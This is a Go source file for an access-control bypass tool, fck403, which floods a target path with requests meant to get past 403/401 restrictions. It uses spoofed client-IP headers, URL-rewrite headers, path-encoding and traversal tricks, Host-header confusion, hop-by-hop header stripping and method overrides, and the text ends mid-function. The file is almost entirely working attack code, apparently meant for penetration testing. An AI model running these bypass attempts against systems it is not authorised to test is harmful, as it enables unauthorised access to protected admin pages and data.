package main

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const version = "2.1"

const (
	Reset  = "\033[0m"
	Red    = "\033[0;31m"
	Green  = "\033[0;32m"
	Yellow = "\033[0;33m"
	Blue   = "\033[0;34m"
	Cyan   = "\033[0;36m"
	Gray   = "\033[0;90m"
	White  = "\033[1;37m"
	Bold   = "\033[1m"
	BRed   = "\033[1;31m"
	BGreen = "\033[1;32m"
	BCyan  = "\033[1;36m"
)

var moduleNames = []string{
	"methods", "paths", "headers", "rewrite",
	"ua", "referer", "host", "hopbyhop",
	"protocol", "port", "misc",
}

type Config struct {
	URL             string
	Path            string
	Threads         int
	Timeout         int
	Delay           int // milliseconds between requests
	Output          string
	Proxy           string
	Cookie          string
	Header          string
	SuccessOnly     bool
	Verbose         bool
	FollowRedirects bool
	Modules         map[string]bool
	ListModules     bool
}

type Result struct {
	Category   string  `json:"category"`
	Technique  string  `json:"technique"`
	StatusCode int     `json:"status_code"`
	Size       int64   `json:"size"`
	Time       float64 `json:"time"`
	Location   string  `json:"location,omitempty"`
	bodyHash   [16]byte
}

type Scanner struct {
	cfg      Config
	client   *http.Client
	results  []Result
	mu       sync.Mutex
	sem      chan struct{}
	step     int
	total    int
	baseline Result // fingerprint of the 403 response
	notfound Result // fingerprint of a random 404 path
	rootpage Result // fingerprint of the root page (to detect rewrite false positives)
}

func banner() {
	fmt.Println()
    fmt.Println()
	fmt.Printf("%s   ███████╗ ██████╗██╗  ██╗██╗  ██╗ ██████╗ ██████╗ %s\n", White, Reset)
	fmt.Printf("%s   ██╔════╝██╔════╝██║ ██╔╝██║  ██║██╔═══██╗╚════██╗%s\n", White, Reset)
	fmt.Printf("%s   █████╗  ██║     █████╔╝ ███████║██║   ██║ █████╔╝%s\n", BGreen, Reset)
	fmt.Printf("%s   ██╔══╝  ██║     ██╔═██╗ ╚════██║██║   ██║ ╚═══██╗%s\n", BGreen, Reset)
	fmt.Printf("%s   ██║     ╚██████╗██║  ██╗     ██║╚██████╔╝██████╔╝%s\n", BCyan, Reset)
	fmt.Printf("%s   ╚═╝      ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ %s\n", BCyan, Reset)
	fmt.Println()
	fmt.Println()
}

func listModules() {
	banner()
	fmt.Printf("%s  Available modules:%s\n\n", Bold, Reset)
	descs := map[string]string{
		"methods":  "HTTP methods + overrides + Accept/CT/Encoding/Lang (48 requests)",
		"paths":    "Path manipulation, encoding, case, extensions (47 requests)",
		"headers":  "IP spoofing headers x10 IPs (220 requests)",
		"rewrite":  "X-Original-URL, X-Rewrite-URL, X-Forwarded-Prefix (9 requests)",
		"ua":       "User-Agent spoofing: Googlebot, Bingbot, etc. (9 requests)",
		"referer":  "Referer header spoofing (6 requests)",
		"host":     "Host header manipulation + confusion (8 requests)",
		"hopbyhop": "Hop-by-hop header abuse to strip security headers (11 requests)",
		"protocol": "HTTP/1.0, HTTP/1.1, HTTP/2 real protocol switch (3 requests)",
		"port":     "X-Forwarded-Proto, X-Forwarded-Port (6 requests)",
		"misc":     "Wayback Machine, direct IP, API version fuzzing (varies)",
	}
	for _, name := range moduleNames {
		fmt.Printf("    %s%-10s%s %s\n", Cyan, name, Reset, descs[name])
	}
	fmt.Printf("\n%s  Usage:%s\n", Bold, Reset)
	fmt.Printf("    fck403 -u https://target.com -p admin -m methods,paths\n")
	fmt.Printf("    fck403 -u https://target.com -p admin -m headers\n")
	fmt.Printf("    fck403 -u https://target.com -p admin              %s(runs all)%s\n\n", Gray, Reset)
}

func NewScanner(cfg Config) *Scanner {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        cfg.Threads * 2,
		MaxIdleConnsPerHost: cfg.Threads * 2,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
		Proxy:               http.ProxyFromEnvironment,
		ForceAttemptHTTP2:   true,
	}

	if cfg.Proxy != "" {
		proxyURL, err := url.Parse(cfg.Proxy)
		if err != nil {
			fmt.Printf("%sInvalid proxy URL: %v%s\n", Red, err, Reset)
			os.Exit(1)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Timeout:   time.Duration(cfg.Timeout) * time.Second,
		Transport: transport,
	}
	if !cfg.FollowRedirects {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}
	}

	total := 0
	for _, name := range moduleNames {
		if cfg.Modules[name] {
			total++
		}
	}

	return &Scanner{
		cfg:    cfg,
		client: client,
		sem:    make(chan struct{}, cfg.Threads),
		total:  total,
	}
}

func (s *Scanner) doRequest(category, technique, method, reqURL string, headers map[string]string) {
	s.doRequestWithClient(s.client, category, technique, method, reqURL, headers)
}

func (s *Scanner) doRequestWithClient(client *http.Client, category, technique, method, reqURL string, headers map[string]string) {
	s.sem <- struct{}{}
	defer func() { <-s.sem }()

	if s.cfg.Delay > 0 {
		time.Sleep(time.Duration(s.cfg.Delay) * time.Millisecond)
	}

	req, err := http.NewRequest(method, reqURL, nil)
	if err != nil {
		if s.cfg.Verbose {
			fmt.Printf("%s  [ERR] %s: %v%s\n", Gray, technique, err, Reset)
		}
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	if s.cfg.Cookie != "" {
		req.Header.Set("Cookie", s.cfg.Cookie)
	}
	if s.cfg.Header != "" {
		parts := strings.SplitN(s.cfg.Header, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	for k, v := range headers {
		if strings.ToLower(k) == "host" {
			req.Host = v
		} else {
			req.Header.Set(k, v)
		}
	}

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start).Seconds()

	if err != nil {
		if s.cfg.Verbose {
			fmt.Printf("%s  [ERR] %s: %v%s\n", Gray, technique, err, Reset)
		}
		return
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if s.cfg.Verbose {
			fmt.Printf("%s  [ERR] %s: read body: %v%s\n", Gray, technique, err, Reset)
		}
		return
	}
	size := int64(len(body))

	result := Result{
		Category:   category,
		Technique:  technique,
		StatusCode: resp.StatusCode,
		Size:       size,
		Time:       elapsed,
		Location:   resp.Header.Get("Location"),
		bodyHash:   md5.Sum(body),
	}

	s.mu.Lock()
	s.results = append(s.results, result)
	s.mu.Unlock()

	s.printResult(result)
}

func (s *Scanner) printResult(r Result) {
	if s.cfg.Output != "text" {
		return
	}
	if s.cfg.SuccessOnly && !s.isLikelyBypass(r) {
		return
	}

	color := Red
	switch {
	case s.isLikelyBypass(r):
		color = Green
	case r.StatusCode >= 300 && r.StatusCode < 400:
		color = Yellow
	case r.StatusCode == 0:
		color = Gray
	}

	loc := ""
	if r.Location != "" {
		loc = fmt.Sprintf(" -> %s", r.Location)
	}
	fmt.Printf("%s  [%d]  %6d B  %5.2fs  %-16s %s%s%s\n",
		color, r.StatusCode, r.Size, r.Time, r.Category, r.Technique, loc, Reset)
}

func (s *Scanner) section(name string) {
	s.step++
	fmt.Printf("\n%s%s[%d/%d] %s%s\n", Bold, Blue, s.step, s.total, name, Reset)
}

func (s *Scanner) baseURL() string {
	return fmt.Sprintf("%s/%s", s.cfg.URL, s.cfg.Path)
}

func (s *Scanner) doBaselineRequest(reqURL string) Result {
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return Result{}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	if s.cfg.Cookie != "" {
		req.Header.Set("Cookie", s.cfg.Cookie)
	}
	if s.cfg.Header != "" {
		parts := strings.SplitN(s.cfg.Header, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	start := time.Now()
	resp, err := s.client.Do(req)
	elapsed := time.Since(start).Seconds()
	if err != nil {
		return Result{}
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return Result{StatusCode: resp.StatusCode, Time: elapsed}
	}

	return Result{
		StatusCode: resp.StatusCode,
		Size:       int64(len(body)),
		Time:       elapsed,
		bodyHash:   md5.Sum(body),
	}
}

func (s *Scanner) isLikelyBypass(r Result) bool {
	// 403/401 are always blocked
	if r.StatusCode == 403 || r.StatusCode == 401 {
		return false
	}
	// Same response as the original 403 page (custom error page returning 200)
	if r.StatusCode == s.baseline.StatusCode && r.Size == s.baseline.Size && r.bodyHash == s.baseline.bodyHash {
		return false
	}
	// Same response as a random non-existent path (default 404/error page)
	if s.notfound.StatusCode != 0 && r.StatusCode == s.notfound.StatusCode && r.Size == s.notfound.Size && r.bodyHash == s.notfound.bodyHash {
		return false
	}
	// Same response as root page (rewrite headers that get ignored serve / instead)
	if s.rootpage.StatusCode != 0 && r.StatusCode == s.rootpage.StatusCode && r.Size == s.rootpage.Size && r.bodyHash == s.rootpage.bodyHash {
		return false
	}
	// Redirects are interesting but not confirmed bypasses
	if r.StatusCode >= 300 && r.StatusCode < 400 {
		return false
	}
	return true
}

// ── MODULE: HTTP Methods ─────────────────────────────────────────────────────

func (s *Scanner) runMethods() {
	s.section("HTTP Methods")

	methods := []string{"POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE",
		"CONNECT", "PROPFIND", "MOVE", "COPY", "LOCK", "UNLOCK", "MKCOL"}

	var wg sync.WaitGroup
	for _, m := range methods {
		wg.Add(1)
		go func(method string) {
			defer wg.Done()
			s.doRequest("METHOD", fmt.Sprintf("-X %s %s", method, s.baseURL()), method, s.baseURL(), nil)
		}(m)
	}

	overrides := []struct{ h, v string }{
		{"X-HTTP-Method-Override", "PUT"}, {"X-HTTP-Method-Override", "DELETE"},
		{"X-HTTP-Method-Override", "PATCH"}, {"X-HTTP-Method", "PUT"},
		{"X-Method-Override", "PUT"}, {"X-HTTP-Method-Override", "GET"},
	}
	for _, o := range overrides {
		wg.Add(1)
		go func(h, v string) {
			defer wg.Done()
			s.doRequest("METHOD-OVERRIDE", fmt.Sprintf("-H '%s: %s'", h, v), "GET", s.baseURL(), map[string]string{h: v})
		}(o.h, o.v)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		s.doRequest("METHOD", "-X POST Content-Length:0", "POST", s.baseURL(), map[string]string{"Content-Length": "0"})
	}()

	// Accept header variants - backends may route differently based on Accept
	accepts := []string{
		"application/json", "application/xml", "text/plain",
		"text/html", "*/*",
	}
	for _, a := range accepts {
		wg.Add(1)
		go func(accept string) {
			defer wg.Done()
			s.doRequest("ACCEPT", fmt.Sprintf("-H 'Accept: %s'", accept), "GET", s.baseURL(), map[string]string{"Accept": accept})
		}(a)
	}

	// Content-Type tricks on POST - frameworks may route based on Content-Type
	ctypes := []string{
		"application/json", "application/xml",
		"application/x-www-form-urlencoded", "text/plain",
	}
	for _, ct := range ctypes {
		wg.Add(1)
		go func(ctype string) {
			defer wg.Done()
			s.doRequest("CONTENT-TYPE", fmt.Sprintf("-X POST -H 'Content-Type: %s'", ctype), "POST", s.baseURL(), map[string]string{"Content-Type": ctype, "Content-Length": "0"})
		}(ct)
	}

	// Accept-Encoding - some backends/CDNs serve different content or skip auth based on encoding
	encodings := []string{
		"gzip", "deflate", "br", "identity", "gzip, deflate, br",
		"*", "compress", "chunked",
	}
	for _, enc := range encodings {
		wg.Add(1)
		go func(e string) {
			defer wg.Done()
			s.doRequest("ACCEPT-ENC", fmt.Sprintf("-H 'Accept-Encoding: %s'", e), "GET", s.baseURL(), map[string]string{"Accept-Encoding": e})
		}(enc)
	}

	// Accept-Language - geo-restricted content may respond differently to language hints
	languages := []string{
		"en-US,en;q=0.9", "en", "*", "de", "fr", "ja", "zh-CN,zh;q=0.9",
		"es-ES,es;q=0.9", "ar", "ru",
	}
	for _, lang := range languages {
		wg.Add(1)
		go func(l string) {
			defer wg.Done()
			s.doRequest("ACCEPT-LANG", fmt.Sprintf("-H 'Accept-Language: %s'", l), "GET", s.baseURL(), map[string]string{"Accept-Language": l})
		}(lang)
	}

	wg.Wait()
}

// ── MODULE: Path Manipulation ────────────────────────────────────────────────

func (s *Scanner) runPaths() {
	s.section("Path Manipulation")

	u, p := s.cfg.URL, s.cfg.Path
	upper := strings.ToUpper(p)
	mixed := p
	if len(mixed) > 1 {
		mixed = string(p[0]) + strings.ToUpper(string(p[1])) + p[2:]
	}

	paths := []string{
		u + "/%2e/" + p, u + "/" + p + "/.", u + "//" + p + "//",
		u + "/./" + p + "/./", u + "/" + p + "/", u + "/" + p + "//",
		u + "/" + p + "/./", u + "/./" + p, u + "/" + p + "..;/",
		u + "/" + p + ";/", u + "/.;/" + p, u + "/;/" + p,
		u + "//;//" + p, u + "/" + p + "/*", u + "/" + p + "..",
		u + "/" + p + "...;",
		u + "/%252e/" + p, u + "/%252e%252e/" + p, u + "/" + p + "%252f",
		u + "/%ef%bc%8f" + p,
		u + "/" + p + "%00", u + "/" + p + "%00.html", u + "/" + p + "%00.json",
		u + "\\" + p, u + "/" + p + "\\",
		u + "/" + p + "%20", u + "/" + p + "%09",
		u + "/" + p + "?", u + "/" + p + "?anything",
		u + "/" + p + "#", u + "/" + p + "%23",
		u + "/" + upper, u + "/" + mixed,
		u + "/" + p + ".html", u + "/" + p + ".php", u + "/" + p + ".json",
		u + "/" + p + ".css", u + "/" + p + ".ico", u + "/" + p + ".txt",
		u + "/" + p + ".xml", u + "/" + p + ".anything",
		u + "/" + p + ".jsp", u + "/" + p + ".aspx",
		u + "/" + p + ".",
		u + "/" + p + "/../" + p, u + "/.//" + p, u + "/./" + p + "/../" + p,
	}

	// Per-segment tricks for multi-segment paths (e.g. dashboard/server)
	segments := strings.Split(p, "/")
	if len(segments) > 1 {
		for i := 0; i < len(segments)-1; i++ {
			before := strings.Join(segments[:i+1], "/")
			after := strings.Join(segments[i+1:], "/")

			// Inject traversal/bypass chars between segments
			paths = append(paths,
				u+"/"+before+"/./"+after,                             // dashboard/./server
				u+"/"+before+";/"+after,                              // dashboard;/server
				u+"/"+before+"/..;/"+after,                           // dashboard/..;/server
				u+"/"+before+"/../"+before+"/"+after,                 // dashboard/../dashboard/server
				u+"/"+before+"%2f"+after,                             // dashboard%2fserver
				u+"/"+before+"%252f"+after,                           // dashboard%252fserver (double-encode)
				u+"/"+before+"%ef%bc%8f"+after,                       // dashboard<unicode-slash>server
				u+"/"+before+"//"+after,                              // dashboard//server
				u+"/"+before+"/.;/"+after,                            // dashboard/.;/server
			)
		}

		// Per-segment case variations
		for i, seg := range segments {
			upper := make([]string, len(segments))
			copy(upper, segments)
			upper[i] = strings.ToUpper(seg)
			paths = append(paths, u+"/"+strings.Join(upper, "/"))

			if len(seg) > 1 {
				mixed := make([]string, len(segments))
				copy(mixed, segments)
				mixed[i] = string(seg[0]) + strings.ToUpper(string(seg[1])) + seg[2:]
				paths = append(paths, u+"/"+strings.Join(mixed, "/"))
			}
		}
	}

	var wg sync.WaitGroup
	for _, path := range paths {
		wg.Add(1)
		go func(pt string) {
			defer wg.Done()
			s.doRequest("PATH", pt, "GET", pt, nil)
		}(path)
	}
	wg.Wait()
}

// ── MODULE: IP Spoofing Headers ──────────────────────────────────────────────

func (s *Scanner) runHeaders() {
	s.section("IP Spoofing Headers")

	hdrs := []string{
		"X-Forwarded-For", "X-Forward-For", "X-Forwarded-Host", "Forwarded",
		"X-Real-IP", "X-Remote-IP", "X-Remote-Addr", "X-Trusted-IP",
		"X-Requested-By", "X-Requested-For", "X-Forwarded-Server",
		"X-Originating-IP", "X-ProxyUser-Ip", "X-Custom-IP-Authorization",
		"Client-IP", "True-Client-IP", "Cluster-Client-IP", "CF-Connecting-IP",
		"Fastly-Client-IP", "X-Client-IP", "X-Host", "Via",
	}
	ips := []string{"127.0.0.1", "localhost", "10.0.0.1", "172.16.0.1", "192.168.0.1",
		"0.0.0.0", "127.0.0.1:80", "127.0.0.1:443", "0", "::1"}

	var wg sync.WaitGroup
	for _, h := range hdrs {
		for _, ip := range ips {
			wg.Add(1)
			go func(hdr, val string) {
				defer wg.Done()
				v := val
				if hdr == "Forwarded" {
					v = "for=" + val
				}
				s.doRequest("IP-HEADER", fmt.Sprintf("-H '%s: %s'", hdr, v), "GET", s.baseURL(), map[string]string{hdr: v})
			}(h, ip)
		}
	}
	wg.Wait()
}

// ── MODULE: URL Rewrite ──────────────────────────────────────────────────────

func (s *Scanner) runRewrite() {
	s.section("URL Rewrite Headers")

	var wg sync.WaitGroup
	tests := []struct{ h, v, t string }{
		{"X-Original-URL", "/" + s.cfg.Path, s.cfg.URL + "/"},
		{"X-Rewrite-URL", "/" + s.cfg.Path, s.cfg.URL + "/"},
		{"X-Original-URL", "/" + s.cfg.Path, s.baseURL()},
		{"X-Rewrite-URL", "/" + s.cfg.Path, s.baseURL()},
	}
	for _, t := range tests {
		wg.Add(1)
		go func(h, v, target string) {
			defer wg.Done()
			s.doRequest("REWRITE", fmt.Sprintf("-H '%s: %s' -> %s", h, v, target), "GET", target, map[string]string{h: v})
		}(t.h, t.v, t.t)
	}
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.doRequest("REWRITE", fmt.Sprintf("-H 'Referer: %s'", s.baseURL()), "GET", s.baseURL(), map[string]string{"Referer": s.baseURL()})
	}()

	// X-Forwarded-Prefix - used by Spring Boot, Traefik, and others to rewrite path prefixes
	prefixes := []string{"/", "/" + s.cfg.Path, "/api", ""}
	for _, p := range prefixes {
		wg.Add(1)
		go func(prefix string) {
			defer wg.Done()
			label := prefix
			if label == "" {
				label = "(empty)"
			}
			s.doRequest("REWRITE", fmt.Sprintf("-H 'X-Forwarded-Prefix: %s'", label), "GET", s.baseURL(), map[string]string{"X-Forwarded-Prefix": prefix})
		}(p)
	}

	wg.Wait()
}

// ── MODULE: User-Agent ───────────────────────────────────────────────────────

func (s *Scanner) runUA() {
	s.section("User-Agent Spoofing")

	agents := []string{
		"Googlebot/2.1 (+http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"facebookexternalhit/1.1", "Twitterbot/1.0",
		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
		"curl/8.0", "",
	}

	var wg sync.WaitGroup
	for _, a := range agents {
		wg.Add(1)
		go func(agent string) {
			defer wg.Done()
			label := agent
			if agent == "" {
				label = "(empty)"
			}
			s.doRequest("USER-AGENT", fmt.Sprintf("-A '%s'", label), "GET", s.baseURL(), map[string]string{"User-Agent": agent})
		}(a)
	}
	wg.Wait()
}

// ── MODULE: Referer ──────────────────────────────────────────────────────────

func (s *Scanner) runReferer() {
	s.section("Referer Spoofing")

	refs := []string{
		s.cfg.URL + "/", s.baseURL(), "https://www.google.com/",
		"https://www.google.com/search?q=" + s.cfg.URL,
		"https://localhost/", "https://127.0.0.1/",
	}

	var wg sync.WaitGroup
	for _, r := range refs {
		wg.Add(1)
		go func(ref string) {
			defer wg.Done()
			s.doRequest("REFERER", fmt.Sprintf("-H 'Referer: %s'", ref), "GET", s.baseURL(), map[string]string{"Referer": ref})
		}(r)
	}
	wg.Wait()
}

// ── MODULE: Host Header ──────────────────────────────────────────────────────

func (s *Scanner) runHost() {
	s.section("Host Header")

	tests := []struct{ h, v string }{
		{"Host", "localhost"}, {"Host", "127.0.0.1"}, {"Host", ""},
		{"X-Forwarded-Host", "localhost"}, {"X-Forwarded-Host", "127.0.0.1"},
	}

	var wg sync.WaitGroup
	for _, t := range tests {
		wg.Add(1)
		go func(h, v string) {
			defer wg.Done()
			d := v
			if d == "" {
				d = "(empty)"
			}
			s.doRequest("HOST", fmt.Sprintf("-H '%s: %s'", h, d), "GET", s.baseURL(), map[string]string{h: v})
		}(t.h, t.v)
	}

	// Combined Host confusion: spoofed Host + real domain via X-Forwarded-Host
	// Reverse proxies may use one, backends may use the other
	domain := strings.TrimPrefix(strings.TrimPrefix(s.cfg.URL, "https://"), "http://")
	domain = strings.Split(domain, "/")[0]
	domain = strings.Split(domain, ":")[0]

	combos := []struct{ host, xfh string }{
		{"localhost", domain},
		{"127.0.0.1", domain},
		{domain, "localhost"},
	}
	for _, c := range combos {
		wg.Add(1)
		go func(host, xfh string) {
			defer wg.Done()
			s.doRequest("HOST-CONFUSION", fmt.Sprintf("Host:%s + X-Forwarded-Host:%s", host, xfh), "GET", s.baseURL(),
				map[string]string{"Host": host, "X-Forwarded-Host": xfh})
		}(c.host, c.xfh)
	}

	wg.Wait()
}

// ── MODULE: Hop-by-Hop ───────────────────────────────────────────────────────

func (s *Scanner) runHopByHop() {
	s.section("Hop-by-Hop Header Abuse")

	strip := []string{
		"X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "X-Remote-Addr",
		"Authorization", "X-Custom-IP-Authorization", "Cookie",
		"X-Original-URL", "X-Rewrite-URL", "CF-Connecting-IP", "True-Client-IP",
	}

	var wg sync.WaitGroup
	for _, h := range strip {
		wg.Add(1)
		go func(hdr string) {
			defer wg.Done()
			s.doRequest("HOP-BY-HOP", fmt.Sprintf("Connection: close, %s", hdr), "GET", s.baseURL(), map[string]string{"Connection": "close, " + hdr})
		}(h)
	}
	wg.Wait()
}

// ── MODULE: Protocol Version ─────────────────────────────────────────────────

func (s *Scanner) runProtocol() {
	s.section("Protocol Version")

	// HTTP/1.1 only: disable HTTP/2 via empty TLSNextProto
	h11Transport := &http.Transport{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2: false,
		TLSNextProto:     make(map[string]func(string, *tls.Conn) http.RoundTripper),
	}
	if s.cfg.Proxy != "" {
		if proxyURL, err := url.Parse(s.cfg.Proxy); err == nil {
			h11Transport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	h11Client := &http.Client{
		Timeout:   time.Duration(s.cfg.Timeout) * time.Second,
		Transport: h11Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// HTTP/2 forced
	h2Transport := &http.Transport{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: true},
		ForceAttemptHTTP2: true,
	}
	if s.cfg.Proxy != "" {
		if proxyURL, err := url.Parse(s.cfg.Proxy); err == nil {
			h2Transport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	h2Client := &http.Client{
		Timeout:   time.Duration(s.cfg.Timeout) * time.Second,
		Transport: h2Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var wg sync.WaitGroup

	// HTTP/1.0: set Proto fields + Connection: close on HTTP/1.1 transport
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.sem <- struct{}{}
		defer func() { <-s.sem }()

		req, err := http.NewRequest("GET", s.baseURL(), nil)
		if err != nil {
			return
		}
		req.Proto = "HTTP/1.0"
		req.ProtoMajor = 1
		req.ProtoMinor = 0
		req.Header.Set("Connection", "close")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		if s.cfg.Cookie != "" {
			req.Header.Set("Cookie", s.cfg.Cookie)
		}

		start := time.Now()
		resp, err := h11Client.Do(req)
		elapsed := time.Since(start).Seconds()
		if err != nil {
			if s.cfg.Verbose {
				fmt.Printf("%s  [ERR] HTTP/1.0: %v%s\n", Gray, err, Reset)
			}
			return
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)

		result := Result{
			Category: "PROTOCOL", Technique: "HTTP/1.0 " + s.baseURL(),
			StatusCode: resp.StatusCode, Size: int64(len(body)), Time: elapsed,
		}
		s.mu.Lock()
		s.results = append(s.results, result)
		s.mu.Unlock()
		s.printResult(result)
	}()

	// HTTP/1.1
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.doRequestWithClient(h11Client, "PROTOCOL", "HTTP/1.1 "+s.baseURL(), "GET", s.baseURL(), nil)
	}()

	// HTTP/2
	wg.Add(1)
	go func() {
		defer wg.Done()
		s.doRequestWithClient(h2Client, "PROTOCOL", "HTTP/2 "+s.baseURL(), "GET", s.baseURL(), nil)
	}()

	wg.Wait()
}

// ── MODULE: Port & Proto Headers ─────────────────────────────────────────────

func (s *Scanner) runPort() {
	s.section("Port & Protocol Headers")

	tests := []struct{ h, v string }{
		{"X-Forwarded-Proto", "https"}, {"X-Forwarded-Proto", "http"},
		{"X-Forwarded-Port", "443"}, {"X-Forwarded-Port", "80"},
		{"X-Forwarded-Port", "8080"}, {"X-Forwarded-Port", "8443"},
	}

	var wg sync.WaitGroup
	for _, t := range tests {
		wg.Add(1)
		go func(h, v string) {
			defer wg.Done()
			s.doRequest("PORT-PROTO", fmt.Sprintf("-H '%s: %s'", h, v), "GET", s.baseURL(), map[string]string{h: v})
		}(t.h, t.v)
	}
	wg.Wait()
}

// ── MODULE: Misc ─────────────────────────────────────────────────────────────

func (s *Scanner) runMisc() {
	s.section("Wayback / Direct IP / API Version")

	fmt.Printf("  %sWayback Machine:%s\n", Cyan, Reset)
	wbClient := &http.Client{Timeout: 10 * time.Second}
	resp, err := wbClient.Get(fmt.Sprintf("https://archive.org/wayback/available?url=%s", s.baseURL()))
	if err == nil {
		defer resp.Body.Close()
		var wb map[string]interface{}
		if json.NewDecoder(resp.Body).Decode(&wb) == nil {
			if snaps, ok := wb["archived_snapshots"].(map[string]interface{}); ok {
				if closest, ok := snaps["closest"].(map[string]interface{}); ok {
					fmt.Printf("    Available: %v  URL: %v\n", closest["available"], closest["url"])
				} else {
					fmt.Println("    No snapshot found")
				}
			}
		}
	} else {
		fmt.Println("    Request failed")
	}

	fmt.Printf("  %sDirect IP:%s\n", Cyan, Reset)
	domain := strings.TrimPrefix(strings.TrimPrefix(s.cfg.URL, "https://"), "http://")
	domain = strings.Split(domain, "/")[0]
	domain = strings.Split(domain, ":")[0]
	addrs, err := net.LookupHost(domain)
	if err == nil && len(addrs) > 0 {
		ip := addrs[0]
		fmt.Printf("    %s -> %s\n", domain, ip)
		proto := "https"
		if strings.HasPrefix(s.cfg.URL, "http://") {
			proto = "http"
		}
		url := fmt.Sprintf("%s://%s/%s", proto, ip, s.cfg.Path)
		s.doRequest("DIRECT-IP", fmt.Sprintf("%s -H Host:%s", url, domain), "GET", url, map[string]string{"Host": domain})
	} else {
		fmt.Println("    Could not resolve")
	}

	if strings.Contains(s.cfg.Path, "v1/") || strings.Contains(s.cfg.Path, "v2/") ||
		strings.Contains(s.cfg.Path, "v3/") || strings.Contains(s.cfg.Path, "v4/") {
		fmt.Printf("  %sAPI Version Fuzzing:%s\n", Cyan, Reset)
		for _, v := range []string{"v1", "v2", "v3", "v4"} {
			for _, orig := range []string{"v1", "v2", "v3", "v4"} {
				if strings.Contains(s.cfg.Path, orig+"/") && v != orig {
					alt := strings.Replace(s.cfg.Path, orig+"/", v+"/", 1)
					url := fmt.Sprintf("%s/%s", s.cfg.URL, alt)
					s.doRequest("API-VER", url, "GET", url, nil)
					break
				}
			}
		}
	}
}

// ── RUNNER ────────────────────────────────────────────────────────────────────

func (s *Scanner) Run() {
	banner()

	fmt.Printf("  %sTarget:%s   %s\n", Bold, Reset, s.baseURL())
	fmt.Printf("  %sThreads:%s  %d\n", Bold, Reset, s.cfg.Threads)
	fmt.Printf("  %sTimeout:%s  %ds\n", Bold, Reset, s.cfg.Timeout)
	fmt.Printf("  %sOutput:%s   %s\n", Bold, Reset, s.cfg.Output)
	if s.cfg.Delay > 0 {
		fmt.Printf("  %sDelay:%s    %dms\n", Bold, Reset, s.cfg.Delay)
	}
	if s.cfg.FollowRedirects {
		fmt.Printf("  %sRedirect:%s follow (-L)\n", Bold, Reset)
	}
	if s.cfg.Proxy != "" {
		fmt.Printf("  %sProxy:%s    %s\n", Bold, Reset, s.cfg.Proxy)
	}

	active := []string{}
	for _, name := range moduleNames {
		if s.cfg.Modules[name] {
			active = append(active, name)
		}
	}
	fmt.Printf("  %sModules:%s  %s\n", Bold, Reset, strings.Join(active, ", "))

	// Fingerprint baseline responses for false-positive detection
	fmt.Printf("\n%s  Fingerprinting baseline...%s\n", Gray, Reset)
	s.baseline = s.doBaselineRequest(s.baseURL())
	s.notfound = s.doBaselineRequest(fmt.Sprintf("%s/fck403-notfound-%d", s.cfg.URL, time.Now().UnixNano()))
	rootURL := strings.TrimRight(s.cfg.URL, "/") + "/"
	if rootURL != s.baseURL() {
		s.rootpage = s.doBaselineRequest(rootURL)
	}

	fmt.Printf("  %sBaseline:%s  [%d] %d B %s(target response)%s\n", Bold, Reset, s.baseline.StatusCode, s.baseline.Size, Gray, Reset)
	fmt.Printf("  %sNotFound:%s  [%d] %d B %s(random path)%s\n", Bold, Reset, s.notfound.StatusCode, s.notfound.Size, Gray, Reset)
	if s.rootpage.StatusCode != 0 {
		fmt.Printf("  %sRootPage:%s  [%d] %d B %s(root / response)%s\n", Bold, Reset, s.rootpage.StatusCode, s.rootpage.Size, Gray, Reset)
	}

	fmt.Printf("\n%s  CODE     SIZE   TIME   CATEGORY          TECHNIQUE%s\n", Gray, Reset)
	fmt.Printf("%s  ──────────────────────────────────────────────────────────%s\n", Gray, Reset)

	// Add baseline to results
	s.step = 0
	s.total = len(active)
	s.baseline.Category = "BASELINE"
	s.baseline.Technique = s.baseURL()
	s.results = append(s.results, s.baseline)

	start := time.Now()

	dispatch := map[string]func(){
		"methods":  s.runMethods,
